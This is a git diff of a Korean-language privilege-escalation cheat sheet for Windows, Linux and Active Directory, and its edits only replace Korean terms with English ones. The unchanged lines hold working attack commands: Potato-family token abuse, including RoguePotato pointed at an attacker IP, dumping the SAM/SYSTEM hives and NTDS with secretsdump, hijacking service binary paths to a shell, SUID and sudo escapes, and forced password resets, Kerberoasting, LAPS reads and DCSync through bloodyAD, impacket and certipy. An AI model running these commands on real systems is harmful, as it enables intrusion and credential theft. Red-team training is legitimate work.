@@ -20,10 +20,10 @@ whoami /groups
 | 권한 | 공격 방법 |
 |------|-----------|
 | SeImpersonatePrivilege | Potato 계열 (JuicyPotato, PrintSpoofer, GodPotato) |
-| SeBackupPrivilege | SAM/SYSTEM 레지스트리 덤프, NTDS.dit 복사 |
+| SeBackupPrivilege | SAM/SYSTEM Registry dump, NTDS.dit 복사 |
 | SeRestorePrivilege | 시스템 파일 덮어쓰기 |
-| SeDebugPrivilege | 프로세스 메모리 접근 (lsass 덤프) |
-| SeTakeOwnershipPrivilege | 파일/레지스트리 소유권 획득 |
+| SeDebugPrivilege | 프로세스 메모리 접근 (lsass dump) |
+| SeTakeOwnershipPrivilege | 파일/Registry 소유권 획득 |
 | SeLoadDriverPrivilege | 취약한 드라이버 로드 |
 
 ```bash
@@ -39,8 +39,8 @@ JuicyPotatoNG.exe -t * -p "cmd.exe" -a "/c whoami"
 # RoguePotato (DCOM 원격 활성화를 이용한 token 위장, 특정 환경에서 JuicyPotato 대체재)
 RoguePotato.exe -r <attacker_ip> -c "<clsid>" -e "cmd.exe"
 
-# PetitPotam (MS-EFSRPC를 이용한 강제 인증 유도 후 릴레이/위장에 활용)
-# 별도 NTLM 릴레이 서버 필요
+# PetitPotam (MS-EFSRPC를 이용한 강제 인증 유도 후 relay/위장에 활용)
+# 별도 NTLM relay 서버 필요
 python3 PetitPotam.py -u <user> -p <pass> -d <domain> <listener_ip> <dc_ip>
 ```
 
@@ -50,13 +50,13 @@ python3 PetitPotam.py -u <user> -p <pass> -d <domain> <listener_ip> <dc_ip>
 ### SeBackupPrivilege
 
 ```powershell
-# SAM, SYSTEM 레지스트리 덤프
+# SAM, SYSTEM Registry dump
 reg save HKLM\SAM sam.bak
 reg save HKLM\SYSTEM system.bak
 ```
 
 ```bash
-# 공격자 호스트에서 해시 추출
+# 공격자 호스트에서 hash 추출
 impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 ```
 
@@ -67,7 +67,7 @@ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
 accesschk.exe /accepteula -uwcqv "Authenticated Users" *
 accesschk.exe /accepteula -uwcqv <user> <service>
 
-# 서비스 바이너리 경로 변경
+# 서비스 binary 경로 변경
 sc config <service> binpath= "C:\Windows\Temp\shell.exe"
 sc stop <service>
 sc start <service>
@@ -77,7 +77,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 ```
 
 !!! warning "탐지"
-    서비스 바이너리 경로 변경: Event 7045 (신규 서비스), Event 4697. `sc config` 실행 시 Sysmon Event 1에서 `binpath` 변경 감지.
+    서비스 binary 경로 변경: Event 7045 (신규 서비스), Event 4697. `sc config` 실행 시 Sysmon Event 1에서 `binpath` 변경 감지.
 
 ### 그룹 기반 권한 상승
 
@@ -91,7 +91,7 @@ wmic service get name,displayname,pathname,startmode | findstr /i "auto" | finds
 **Server Operators:**
 
 ```powershell
-# 기존 서비스 바이너리 경로 변경 → SYSTEM 권한 획득
+# 기존 서비스 binary 경로 변경 → SYSTEM 권한 획득
 sc config VSS binpath= "C:\temp\shell.exe"
 sc stop VSS
 sc start VSS
@@ -106,7 +106,7 @@ reg save HKLM\SAM C:\temp\sam.bak
 reg save HKLM\SYSTEM C:\temp\system.bak
 
 # diskshadow로 NTDS.dit 복사 (DC에서)
-# 이후 impacket-secretsdump로 해시 추출
+# 이후 impacket-secretsdump로 hash 추출
 ```
 
 **DnsAdmins:**
@@ -153,14 +153,14 @@ Invoke-AllChecks
 ### SUID/SGID
 
 ```bash
-# SUID 바이너리 검색
+# SUID binary 검색
 find / -perm -4000 -type f 2>/dev/null
 
-# SGID 바이너리 검색
+# SGID binary 검색
 find / -perm -2000 -type f 2>/dev/null
 ```
 
-활용 방법은 [GTFOBins](https://gtfobins.github.io/)에서 해당 바이너리를 검색한다.
+활용 방법은 [GTFOBins](https://gtfobins.github.io/)에서 해당 binary를 검색한다.
 
 ### Sudo
 
@@ -168,7 +168,7 @@ find / -perm -2000 -type f 2>/dev/null
 # sudo 권한 확인
 sudo -l
 
-# (ALL) NOPASSWD 항목이 있으면 해당 바이너리 악용
+# (ALL) NOPASSWD 항목이 있으면 해당 binary 악용
 # 예: sudo /usr/bin/vim → :!sh
 ```
 
@@ -189,7 +189,7 @@ ls -la /etc/cron.daily/
 ### Capabilities
 
 ```bash
-# capability가 설정된 바이너리 검색
+# capability가 설정된 binary 검색
 getcap -r / 2>/dev/null
 
 # 예: cap_setuid가 설정된 python3
@@ -227,7 +227,7 @@ searchsploit linux kernel <version>
 # pspy (크론/백그라운드 프로세스 실시간 모니터링)
 ./pspy64
 
-# SUID3NUM (SUID/SGID 바이너리 자동 탐지 및 GTFOBins 매칭)
+# SUID3NUM (SUID/SGID binary 자동 탐지 및 GTFOBins 매칭)
 python3 suid3num.py
 ```
 
@@ -243,13 +243,13 @@ BloodHound에서 확인된 ACL 관계를 기반으로 공격 경로를 찾는다
 
 | 권한 | 가능한 행동 |
 |------|------------|
-| GenericAll | 대상 객체에 대한 모든 제어 (패스워드 변경, 그룹 추가 등) |
+| GenericAll | 대상 객체에 대한 모든 제어 (password 변경, 그룹 추가 등) |
 | GenericWrite | 속성 변경 (SPN 추가 → Kerberoasting, msDS-KeyCredentialLink 등) |
 | WriteDACL | ACL 수정 (자신에게 GenericAll 등 권한 부여) |
 | WriteOwner | 소유자 변경 → 이후 WriteDACL로 ACL 수정 가능 |
-| ForceChangePassword | 패스워드 강제 변경 (현재 패스워드 몰라도 가능) |
+| ForceChangePassword | password 강제 변경 (현재 password 몰라도 가능) |
 | AddMember | 그룹에 멤버 추가 |
-| AllExtendedRights | 패스워드 변경, LAPS 읽기 등 확장 권한 |
+| AllExtendedRights | password 변경, LAPS 읽기 등 확장 권한 |
 | Owns | 오브젝트 소유자 → WriteDACL과 동일한 효과 |
 
 ### GenericAll 악용
@@ -257,11 +257,11 @@ BloodHound에서 확인된 ACL 관계를 기반으로 공격 경로를 찾는다
 대상 객체에 대한 완전한 제어 권한. 사용자, 그룹, 컴퓨터 객체에 따라 공격 방식이 다르다.
 
 ```bash
-# 사용자 객체 - 패스워드 변경
+# 사용자 객체 - password 변경
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   set password <target_user> '<new_pass>'
 
-# 사용자 객체 - Targeted Kerberoasting (SPN 추가 후 해시 획득)
+# 사용자 객체 - Targeted Kerberoasting (SPN 추가 후 hash 획득)
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   set object <target_user> servicePrincipalName -v 'HTTP/fake.domain.local'
 impacket-GetUserSPNs '<domain>/<user>:<pass>' -dc-ip <dc_ip> -request -outputfile kerberoast.txt
@@ -340,7 +340,7 @@ impacket-owneredit -action write -new-owner '<user>' \
 
 ### ForceChangePassword 악용
 
-대상 사용자의 패스워드를 현재 패스워드를 모르는 상태에서 강제 변경할 수 있다.
+대상 사용자의 password를 현재 password를 모르는 상태에서 강제 변경할 수 있다.
 
 ```bash
 # bloodyAD
@@ -379,17 +379,17 @@ net rpc group members "<group>" -U "<domain>/<user>%<pass>" -S <dc_ip>
 
 ### AllExtendedRights 악용
 
-확장 권한으로, 패스워드 변경과 LAPS 패스워드 읽기 등이 가능하다.
+확장 권한으로, password 변경과 LAPS password 읽기 등이 가능하다.
 
 ```bash
-# LAPS 패스워드 읽기
+# LAPS password 읽기
 nxc ldap <dc_ip> -u '<user>' -p '<pass>' -M laps
 
 # bloodyAD로 LAPS 읽기
 bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<pass>' \
   get object <computer> --attr ms-MCS-AdmPwd
 
-# 패스워드 변경은 ForceChangePassword와 동일하게 진행
+# password 변경은 ForceChangePassword와 동일하게 진행
 ```
 
 ### DACL 공격 체인 예시
@@ -408,14 +408,14 @@ BloodHound에서 발견되는 일반적인 공격 체인:
 ```text
 공격자 -[GenericWrite]→ User
   → SPN 추가 (Targeted Kerberoasting)
-    → 해시 크래킹
+    → hash cracking
       → 해당 사용자로 접근
 ```
 
 ```text
 공격자 -[WriteDACL]→ Domain Object
   → DCSync 권한 부여
-    → secretsdump로 전체 해시 덤프
+    → secretsdump로 전체 hash dump
       → Domain Admin으로 인증
 ```
 
@@ -424,7 +424,7 @@ BloodHound에서 발견되는 일반적인 공격 체인:
 대상 계정의 msDS-KeyCredentialLink 속성에 credential을 추가하여 PKINIT으로 TGT를 획득하는 기법.
 
 ```bash
-# certipy shadow auto: credential 추가 → TGT 획득 → NTLM 해시 추출
+# certipy shadow auto: credential 추가 → TGT 획득 → NTLM hash 추출
 certipy shadow auto -username <user>@<domain> -password '<pass>' -account <target>
 ```
 
